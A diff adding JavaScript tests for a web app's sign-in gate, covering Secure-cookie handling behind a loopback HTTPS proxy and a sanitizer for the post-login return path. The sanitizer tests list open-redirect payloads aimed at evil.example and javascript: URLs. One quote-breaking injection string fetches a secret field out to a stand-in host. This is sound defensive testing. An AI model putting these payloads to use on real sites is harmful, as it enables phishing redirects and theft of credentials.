@@ -60,3 +60,48 @@ test('Secure is set only when it was asked for', () => {
   assert.ok(!createGate({ secret: 'x' }).cookieHeader().includes('Secure'));
   assert.ok(createGate({ secret: 'x', secure: true }).cookieHeader().includes('Secure'));
 });
+
+// A request as Node hands it over: the peer is on the socket, not in a header.
+const arriving = (remoteAddress, headers = {}) => ({ headers, socket: { remoteAddress } });
+
+test('Secure follows the request when it came through a local HTTPS proxy', () => {
+  const gate = createGate({ secret: 'x' });
+  // Tailscale Serve terminates TLS and forwards to loopback, saying so.
+  for (const peer of ['127.0.0.1', '::1', '::ffff:127.0.0.1']) {
+    const req = arriving(peer, { 'x-forwarded-proto': 'https' });
+    assert.ok(gate.cookieHeader(req).includes('; Secure'), peer);
+    assert.ok(gate.clearHeader(req).includes('; Secure'), peer);
+  }
+  // Plain http://localhost keeps working, in Safari too, which drops a Secure
+  // cookie over http even on localhost.
+  assert.ok(!gate.cookieHeader(arriving('127.0.0.1')).includes('Secure'));
+});
+
+test('a forwarded-proto header from anywhere but loopback is not believed', () => {
+  const gate = createGate({ secret: 'x' });
+  const req = arriving('192.168.1.20', { 'x-forwarded-proto': 'https' });
+  assert.ok(!gate.cookieHeader(req).includes('Secure'));
+});
+
+test('asking for Secure still means always', () => {
+  const gate = createGate({ secret: 'x', secure: true });
+  assert.ok(gate.cookieHeader(arriving('127.0.0.1')).includes('; Secure'));
+});
+
+test('where the gate sends you after signing in is a path on this host, or /', async () => {
+  const { returnPath } = await import('../server/gate.js');
+  const home = [
+    undefined, null, '', 'a/drive', '//evil.example', '//evil.example/x', '/\\evil.example', '/\\/evil.example',
+    'javascript:alert(1)', 'JavaScript:alert(1)', ' /a', 'https://evil.example/', '/\t/evil.example', '/\n/evil.example',
+    "');fetch('https://x/?'+this.secret.value);('", '/a\u0000b', '/a\u007fb',
+  ];
+  // Dot segments the parser removes can leave a leading // behind.
+  home.push(
+    '/.//evil.example', '/./\\evil.example', '/.\\/evil.example', '/a/..//evil.example', '/..//evil.example',
+    '/%2e//evil.example', '/%2E%2E//evil.example', '/a/../\\evil.example', '/././/evil',
+  );
+  for (const to of home) assert.equal(returnPath(to), '/', JSON.stringify(to));
+  assert.equal(returnPath('/a/drive?x=1'), '/a/drive?x=1');
+  assert.equal(returnPath('/a/My%20Notes#top'), '/a/My%20Notes#top');
+  assert.equal(returnPath('/'), '/');
+});
